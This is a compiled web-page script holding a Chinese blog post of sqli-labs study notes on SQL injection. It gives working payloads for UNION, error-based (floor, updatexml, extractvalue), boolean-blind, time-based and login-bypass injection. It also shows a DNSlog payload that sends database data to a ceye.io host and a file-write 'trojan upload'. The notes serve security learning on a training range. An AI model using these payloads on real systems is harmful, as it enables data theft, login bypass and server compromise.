(window.webpackJsonp=window.webpackJsonp||[]).push([[13],{491:function(t,s,a){"use strict";a.r(s);var n=a(1),e=Object(n.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("p",[t._v("本篇博客主要是对常见sql注入漏洞的总结")]),t._v(" "),s("p",[s("img",{attrs:{src:"http://wangdengdeng.oss-cn-hangzhou.aliyuncs.com/img/image-20220313152608521.png",alt:"image-20220313152608521"}})]),t._v(" "),s("h1",{attrs:{id:"一、注入"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#一、注入"}},[t._v("#")]),t._v(" 一、注入")]),t._v(" "),s("h2",{attrs:{id:"sql注入攻击"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#sql注入攻击"}},[t._v("#")]),t._v(" sql注入攻击")]),t._v(" "),s("p",[t._v("sqlmap会用，但是手注是真的硬性要求。")]),t._v(" "),s("h2",{attrs:{id:"sql注入的两个标准条件"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#sql注入的两个标准条件"}},[t._v("#")]),t._v(" sql注入的两个标准条件：")]),t._v(" "),s("blockquote",[s("p",[t._v("1.在注入过程中，有可控的参数（即用户可以手动输入）")]),t._v(" "),s("p",[t._v("2.可插入实现攻击的代码与参数传入过程的拼接。")])]),t._v(" "),s("h2",{attrs:{id:"巧妙利用错误回显"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#巧妙利用错误回显"}},[t._v("#")]),t._v(" 巧妙利用错误回显")]),t._v(" "),s("p",[t._v("将语句之中带入语法错误的内容，如果web服务器开启了==错误回显==，可以在回显的内容中得到数据库版本的信息，从而利用对应的注入语句。")]),t._v(" "),s("h2",{attrs:{id:"关闭错误回显的盲注"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#关闭错误回显的盲注"}},[t._v("#")]),t._v(" 关闭错误回显的盲注")]),t._v(" "),s("p",[t._v("在web服务器关闭了错误回显时，用到盲注可以判断是否存在sql注入。")]),t._v(" "),s("h3",{attrs:{id:"原理"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#原理"}},[t._v("#")]),t._v(" 原理")]),t._v(" "),s("p",[t._v("构造简单的条件判断语句，判断返回界面的变化。")]),t._v(" "),s("p",[t._v("常见的判断and方法判断：")]),t._v(" "),s("p",[t._v("1=1 \t1=2")]),t._v(" "),s("h1",{attrs:{id:"二、sqli-labs靶场"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#二、sqli-labs靶场"}},[t._v("#")]),t._v(" 二、sqli-labs靶场：")]),t._v(" "),s("h2",{attrs:{id:"一、整数型注入"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#一、整数型注入"}},[t._v("#")]),t._v(" 一、整数型注入")]),t._v(" "),s("p",[t._v("1.整数型注入：")]),t._v(" "),s("p",[t._v("怎么判断注入类型？")]),t._v(" "),s("div",{staticClass:"language-python extra-class"},[s("pre",{pre:!0,attrs:{class:"language-python"}},[s("code",[s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("?"),s("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("id")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v("   等于\t\t"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("?"),s("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("id")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v(" \n")])])]),s("p",[t._v("针对于整数型和字符型的基本判断")]),t._v(" "),s("p",[t._v("2.判断字段数")]),t._v(" "),s("div",{staticClass:"language-python extra-class"},[s("pre",{pre:!0,attrs:{class:"language-python"}},[s("code",[t._v("order by  或者\tunion select "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("3")]),t._v("\t\n")])])]),s("p",[t._v("注：select 1之后有几位都可做回显位")]),t._v(" "),s("p",[t._v("3.手注")]),t._v(" "),s("h2",{attrs:{id:"二、字符型注入"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#二、字符型注入"}},[t._v("#")]),t._v(" 二、字符型注入")]),t._v(" "),s("p",[t._v("1.判断类型同上")]),t._v(" "),s("p",[t._v("2.根据回显错误判断是否有符号闭合  （"),s("strong",[t._v('=="==')]),t._v(" "),s("strong",[t._v("=='==")]),t._v("）")]),t._v(" "),s("p",[t._v("3.字符型注入的注释：")]),t._v(" "),s("div",{staticClass:"language-python extra-class"},[s("pre",{pre:!0,attrs:{class:"language-python"}},[s("code",[s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("20")]),t._v("  "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#就是--空格，#号不好使了，艹")]),t._v("\n")])])]),s("p",[t._v("==payload里必须用转义后的==")]),t._v(" "),s("h2",{attrs:{id:"三、报错注入-error-based-sql-injection"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#三、报错注入-error-based-sql-injection"}},[t._v("#")]),t._v(" 三、报错注入（Error-based SQL injection）")]),t._v(" "),s("p",[t._v("利用前提：在没有回显或回显不可控的情况下(页面上有没有显示位无所谓)，但是需要输出SQL语句执行错误信"),s("br"),t._v("\n息，例如:mysqli_error()")]),t._v(" "),s("p",[t._v("优点：不需要显示位\n缺点：需要输出例如mysqli_error()的报错信息")]),t._v(" "),s("h3",{attrs:{id:"报错注入中的floor注入详解"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#报错注入中的floor注入详解"}},[t._v("#")]),t._v(" 报错注入中的floor注入详解：")]),t._v(" "),s("p",[t._v("Payload：")]),t._v(" "),s("div",{staticClass:"language-mysql extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v("Union select count(*),concat((查询语句),0x26,floor(rand(0)*2))x from information_schema.columns group by x; \n\n\nAND (SELECT COUNT(*) FROM information_schema.`TABLES` GROUP BY CONCAT((payload),FLOOR(RAND(0)*2)));// \n通用\nAND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT(SELECT(payload) FROM information_schema.`TABLES` LIMIT 0,1),FLOOR(RAND(0)*2))X FROM information_schema.`TABLES` GROUP BY X)a)\n//通用\n")])])]),s("ol",[s("li")]),t._v(" "),s("blockquote",[s("p",[t._v("select 1,2")]),t._v(" "),s("p",[t._v("以1，2作为字段名，打印输出表中的所有信息（若无1，2则直接输出1，2在表中）如图：")])]),t._v(" "),s("ol",{attrs:{start:"2"}},[s("li")]),t._v(" "),s("blockquote",[s("p",[t._v("count(*) 将所选中表的数据条数显示出来")])]),t._v(" "),s("ol",{attrs:{start:"3"}},[s("li")]),t._v(" "),s("blockquote",[s("p",[t._v("floor(rand(0)*2))x")]),t._v(" "),s("p",[t._v("floor是取小数点，向下取整，rand()将随机出现一个介于0，1之间的小数，但是rand(0)则根据数据条数的递增，成为一组固定数值，如图：")]),t._v(" "),s("p",[t._v("乘以二取整之后前六位为011011，是一组固定的数字")])]),t._v(" "),s("blockquote",[s("p",[t._v("group by:")]),t._v(" "),s("p",[t._v("group by key 在执行时循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则更新临时表中的数据（更新数据时，不再计算rand值）；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。（插入数据时，会再计算rand值）")]),t._v(" "),s("p",[t._v("简单的说，就是在执行分组语句时，会建立一个虚拟表，有相同数据直接存入，没有则新建")]),t._v(" "),s("p",[t._v("问题出在当第一次计算的0插入时会再次进行计算rand，得到1插入，再算下一个是1，直接加加，再下一个是0，发现没有0，要插入，但插入时**==再次计算==**发现是1，且已经存在1了，此时有冲突，就会报错。")])]),t._v(" "),s("h3",{attrs:{id:"报错注入的其他函数"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#报错注入的其他函数"}},[t._v("#")]),t._v(" 报错注入的其他函数")]),t._v(" "),s("p",[s("strong",[t._v("updatexml")]),t._v("函数")]),t._v(" "),s("blockquote",[s("p",[t._v("报错的原理：")]),t._v(" "),s("p",[t._v("因为在"),s("strong",[t._v("updatexml")]),t._v("函数传参中，第二位Xpath路径错误即会报错")])]),t._v(" "),s("p",[s("img",{attrs:{src:"http://wangdengdeng.oss-cn-hangzhou.aliyuncs.com/img/image-20220309191541284.png",alt:"image-20220309191541284"}})]),t._v(" "),s("p",[t._v("具有查询功能 并且会再xpath处查询 你将语法构造错误 然后它就会将他查询的结果已报错的形式显示出来")]),t._v(" "),s("p",[t._v("payload：")]),t._v(" "),s("div",{staticClass:"language-mysql extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v("and updatexml(1,concat(0x7e,(select (select table_name from information_schema.tables where table_schema= '库名' limit 0,1)),0x7e),1) --%20\n\nand updatexml(1,concat(0x7e,(select (select column_name from information_schema.columns where table_name= '表名' limit 0,1)),0x7e),1)\n\nand updatexml(1,concat(0x7e,(select (select id from 库名.表名 limit 0,1)),0x7e),1)\n")])])]),s("p",[s("strong",[t._v("limit的用法")])]),t._v(" "),s("blockquote",[s("p",[t._v("limit i,n")])]),t._v(" "),s("p",[t._v("默认输出从i条==开始==的==前==n条数据，所以在查询表名或字段名不符合想法的，换1，1，这样挨个检索要求找到的信息。")]),t._v(" "),s("p",[s("strong",[t._v("extractvalue()")])]),t._v(" "),s("div",{staticClass:"language-mysql extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v("extractvalue(1,concat())  #用法同上\n")])])]),s("p",[s("code",[t._v("extractvalue(xml_frag,xpath_expr)")])]),t._v(" "),s("p",[t._v("函数接受两个参数，第一个为XML标记内容，也就是查询的内容，第二个为XPATH路径，也就是查询的路径。如果没有匹配内容，不管出于何种原因，只要 xpath_expr有效，并且 xml_frag由正确嵌套和关闭的元素组成 - 返回空字符串。不区分空元素的匹配和无匹配。但是如果XPATH写入错误格式，就会报错，并且返回我们写入的非法内容")]),t._v(" "),s("h5",{attrs:{id:"报错注入的判断"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#报错注入的判断"}},[t._v("#")]),t._v(" 报错注入的判断")]),t._v(" "),s("p",[t._v("有可能用到报错注入的错误信息：")]),t._v(" "),s("p",[s("img",{attrs:{src:"http://wangdengdeng.oss-cn-hangzhou.aliyuncs.com/img/image-20220309192136465.png",alt:"image-20220309192136465"}})]),t._v(" "),s("p",[t._v("无效报错：")]),t._v(" "),s("p",[s("img",{attrs:{src:"http://wangdengdeng.oss-cn-hangzhou.aliyuncs.com/img/image-20220309192203228.png",alt:"image-20220309192203228"}})]),t._v(" "),s("h2",{attrs:{id:"四、布尔注入-bp-上述报错无效。。"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#四、布尔注入-bp-上述报错无效。。"}},[t._v("#")]),t._v(" 四、布尔注入+bp（上述报错无效。。）")]),t._v(" "),s("h5",{attrs:{id:"substr"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#substr"}},[t._v("#")]),t._v(" substr:")]),t._v(" "),s("p",[s("img",{attrs:{src:"http://wangdengdeng.oss-cn-hangzhou.aliyuncs.com/img/image-20220309195001926.png",alt:"image-20220309195001926"}})]),t._v(" "),s("div",{staticClass:"language-php extra-class"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("?")]),t._v("id"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("and")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("length")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("database")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">=")]),t._v("x "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 判断/猜测库名的长度")]),t._v("\n     "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("and")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("substr")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("database")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'a'")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//取得库名的第一个字母，引申一下就是获取整个库名。（使用bp抓包，在从第几个子符开始也就是第二个参数  和  =后的a  添加有效负载位置，并调整攻击类型为Cb，进行爆破，后续语句相同的bao）  ")]),t._v("\n     "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("and")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("substr")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("select table_name from information_schema"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("tables where table_schema"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'sqli'")]),t._v(" limit "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'a'")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//limit含义：limit 1，2 . 1为从第一个位置开始，2为调用条数为两条  位置仍为第二个参数和等号后的a。   //得到表名。")]),t._v("\n     注意：若第一个表不为flag所在表则需要将limit后第一个参数改为"),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v("，即从"),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),t._v("位置之后的一个位置开始查询，直到找到flag所在表为止。\n     "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("and")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("substr")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("select column_name from information_schema"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("columns where table_name"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'flag'")]),t._v(" limit "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'a'")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//取字段名 设置参数位置相同")]),t._v("\n     "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("and")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("substr")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("select flag from flag"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'a'")]),t._v("  "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//得到flag")]),t._v("\n    \n    \n    \n    id"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("AND")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("USER")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token constant"}},[t._v("REGEXP")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'root@'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("   "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),t._v(" regexp"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("包含\t，用于直接猜\n")])])]),s("p",[t._v("祖传的这一手"),s("strong",[t._v("bp爆破")]),t._v("不能丢~~")]),t._v(" "),s("p",[s("img",{attrs:{src:"http://wangdengdeng.oss-cn-hangzhou.aliyuncs.com/img/image-20220309201955461.png",alt:"image-20220309201955461"}})]),t._v(" "),s("h2",{attrs:{id:"五、无报错-无回显的状况-延时注入"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#五、无报错-无回显的状况-延时注入"}},[t._v("#")]),t._v(" 五、无报错，无回显的状况——延时注入")]),t._v(" "),s("p",[s("strong",[t._v("sleep(n)")])]),t._v(" "),s("p",[t._v("延时时间为n"),s("strong",[t._v("秒")])]),t._v(" "),s("div",{staticClass:"language-mysql extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v("?id=1' and sleep(5) --%20  #判断是否有闭合\n")])])]),s("p",[s("strong",[t._v("if（条件，为真返回，为假返回）")])]),t._v(" "),s("p",[s("img",{attrs:{src:"http://wangdengdeng.oss-cn-hangzhou.aliyuncs.com/img/image-20220309203300247.png",alt:"image-20220309203300247"}})]),t._v(" "),s("div",{staticClass:"language-mysql extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v(" and if(substr(database(),1,1)='s',sleep(5),1)--%20\n")])])]),s("p",[t._v("爆库名就同理了~")]),t._v(" "),s("h2",{attrs:{id:"六、结合登录界面的注入"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#六、结合登录界面的注入"}},[t._v("#")]),t._v(" 六、结合登录界面的注入")]),t._v(" "),s("p",[t._v("登陆的万能密码：")]),t._v(" "),s("div",{staticClass:"language-mysql extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v("1' or 1=1#\n")])])]),s("p",[s("strong",[t._v("再次：")])]),t._v(" "),s("p",[s("img",{attrs:{src:"http://wangdengdeng.oss-cn-hangzhou.aliyuncs.com/img/image-20220312205232950.png",alt:"image-20220312205232950"}})]),t._v(" "),s("p",[t._v("原理：")]),t._v(" "),s("p",[t._v("说白了，or的用法就是想让掩护掉用户名的错误从而进入攻击阶段，所以在进行攻击时，构造payload时，当然就只能")]),t._v(" "),s("p",[t._v("使用==or==的用法。")]),t._v(" "),s("div",{staticClass:"language-sql extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sql"}},[s("code",[t._v("瞎写的用户名（闭合） "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("or")]),t._v(" 注入语句\n")])])]),s("p",[t._v("法一：在万能密码使用之后，如果会回显用户名，则直接用户名登陆，即"),s("code",[t._v("admin’ union 语句")]),t._v(",无回显"),s("strong",[t._v("报错注入")])]),t._v(" "),s("p",[t._v("法二：直接尝试联合注入语句，有可能直接能注进去。")]),t._v(" "),s("p",[t._v("除常规闭合之外，尝试用户名+密码都写一下")]),t._v(" "),s("h2",{attrs:{id:"七、dnslog外带注入"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#七、dnslog外带注入"}},[t._v("#")]),t._v(" 七、DNSlog外带注入")]),t._v(" "),s("p",[t._v("讲解原理：")]),t._v(" "),s("p",[s("img",{attrs:{src:"http://wangdengdeng.oss-cn-hangzhou.aliyuncs.com/img/image-20220317103057355.png",alt:"image-20220317103057355"}})]),t._v(" "),s("p",[t._v("除了利用dnslog外带能够进行注入之外，还可以传马进行文件上传或者XSS的利用")]),t._v(" "),s("p",[t._v("特别注意，申请域名的网站dnslog.cn和ceye在登陆时要用流量，不要用==校园网==")]),t._v(" "),s("p",[t._v("payload展示：")]),t._v(" "),s("p",[t._v("==千万记住==")]),t._v(" "),s("p",[t._v("1.在使用paylaod爆到的信息未能在ceye找到dns记录时，要及时**hex()**转码转为16进制，因为某些敏感字符的原因")]),t._v(" "),s("p",[s("strong",[t._v("2")]),t._v(".在爆破路径中，==63==的参数是由于二级域名长度的限制导致的问题，利用substr分段截取，然后拼接")]),t._v(" "),s("div",{staticClass:"language-sql extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sql"}},[s("code",[t._v("直接利用：\n"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("?id"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("and")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("select")]),t._v(" load_file"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("concat"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'\\\\\\\\'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("select")]),t._v(" version"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'.5pkcu2.ceye.io\\\\abc'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" \n\n爆数据库路径：\nLOAD_FILE"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("CONCAT"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'\\\\\\\\'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("SUBSTR"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("HEX"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("@"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("@basedir")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("60")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'.5pkcu2.ceye.io\\\\abc'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\n传马：\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("union")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("select")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("''")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("''")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'shell'")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("into")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("dumpfile")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'C:\\Users\\Xiaowang\\Tools\\phpstudy\\fuck.php'")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#注意！！！")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#传马中的物理路径要反斜线(sql语句的特殊性)")]),t._v("\n\n")])])]),s("h2",{attrs:{id:"八、基于请求消息的注入"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#八、基于请求消息的注入"}},[t._v("#")]),t._v(" 八、基于请求消息的注入")]),t._v(" "),s("p",[t._v("ua注入以及referer注入")]),t._v(" "),s("p",[s("strong",[t._v("payload")])]),t._v(" "),s("div",{staticClass:"language-sql extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sql"}},[s("code",[s("span",{pre:!0,attrs:{class:"token string"}},[t._v("' or updatexml(1,concat(0x7e,(database()),0x7e),0) or '")]),t._v("\n")])])])])}),[],!1,null,null,null);s.default=e.exports}}]);